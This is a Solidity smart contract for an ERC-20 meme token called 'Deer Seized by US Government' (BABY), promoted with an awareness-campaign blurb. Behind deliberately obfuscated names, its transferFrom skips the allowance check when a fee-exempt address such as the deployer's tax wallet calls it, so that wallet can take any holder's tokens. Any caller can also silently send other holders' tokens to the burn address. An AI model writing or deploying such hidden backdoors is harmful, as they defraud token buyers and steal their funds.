// SPDX-License-Identifier: MIT

/*
    Name: Deer Seized by US Government
    Symbol: BABY

    Baby was wrongfully seized by the PAGC. Please help us spread awareness of our mission to bring #JusticeForBaby 🦌❤ 

    https://www.change.org/p/protect-baby-the-deer-s-right-to-be-an-emotional-support-animal
    https://x.com/babydeer_eth
    https://t.me/babydeer_eth
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract BABY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcBABY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnBABY;
    mapping(address => bool) private _feevblknlBABY;
    address payable private _taxclknlBABY;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Deer Seized by US Government";
    string private constant _symbol = unicode"BABY";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknBABY;
    bool private _inlknblBABY = false;
    bool private swapvlkBABY = false;
    uint256 private _sellcnjkBABY = 0;
    uint256 private _lastflkbnlBABY = 0;
    address constant _deadlknBABY = address(0xdead);

    uint256 private _vkjbnkfjBABY = 10;
    uint256 private _maxovnboiBABY = 10;
    uint256 private _initvkjnbkjBABY = 20;
    uint256 private _finvjlkbnlkjBABY = 0;
    uint256 private _redclkjnkBABY = 2;
    uint256 private _prevlfknjoiBABY = 2;
    uint256 private _buylkvnlkBABY = 0;
    IUniswapV2Router02 private uniswapV2Router;

    uint256 public _vnbbvlkBABY = qq30fef / 100;
    uint256 public _oijboijoiBABY = 15 * 10**18;
    uint256 private _cvjkbnkjBABY = 10;

    modifier lockTheSwap() {
        _inlknblBABY = true;
        _;
        _inlknblBABY = false;
    }
    constructor() payable {
        _taxclknlBABY = payable(_msgSender());
        
        _balknvlkcBABY[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcBABY[address(this)] = (qq30fef * 98) / 100;
        _feevblknlBABY[address(this)] = true;
        _feevblknlBABY[_taxclknlBABY] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcBABY[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function _transfer_kjvnBABY(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblBABY(from, to, amount);
        _balknvlkcBABY[from] = _balknvlkcBABY[from].sub(amount);
        _balknvlkcBABY[to] = _balknvlkcBABY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcBABY[address(this)] = _balknvlkcBABY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknBABY) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojBABY(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlBABY[msg.sender]) return !_feevblknlBABY[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknBABY)) return false;
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnBABY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnBABY(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnBABY(sender, recipient, amount);
        if (_downcklkojBABY(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnBABY[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnBABY[owner][spender];
    }

    function _calcTax_lvknblBABY(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblBABY) {
                taxAmount = amount
                    .mul((_buylkvnlkBABY > _redclkjnkBABY) ? _finvjlkbnlkjBABY : _initvkjnbkjBABY)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlBABY[to] &&
                to != _taxclknlBABY
            ) {
                _buylkvnlkBABY++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblBABY &&
                to == uniswapV2Pair &&
                from != _taxclknlBABY &&
                swapvlkBABY &&
                _buylkvnlkBABY > _prevlfknjoiBABY
            ) {
                if (block.number > _lastflkbnlBABY) {
                    _sellcnjkBABY = 0;
                }
                _sellcnjkBABY = _sellcnjkBABY + _getAmountOut_lvcbnkBABY(amount);
                require(_sellcnjkBABY <= _oijboijoiBABY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkBABY)
                    _swapTokenslknlBABY(_vnbbvlkBABY > amount ? amount : _vnbbvlkBABY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjBABY(address(this).balance);
                }
                _lastflkbnlBABY = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjBABY(uint256 amount) private {
        _taxclknlBABY.transfer(amount);
    }
    
    function enableBABYTrading() external onlyOwner {
        require(!_tradingvlknBABY, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkBABY = true;
        _tradingvlknBABY = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    function _swapTokenslknlBABY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    receive() external payable {}
    function _assist_bnBABY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkBABY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblBABY(address payable newWallet) external {
        require(_feevblknlBABY[_msgSender()]);
        _taxclknlBABY = newWallet;
        _feevblknlBABY[_taxclknlBABY] = true;
    }
}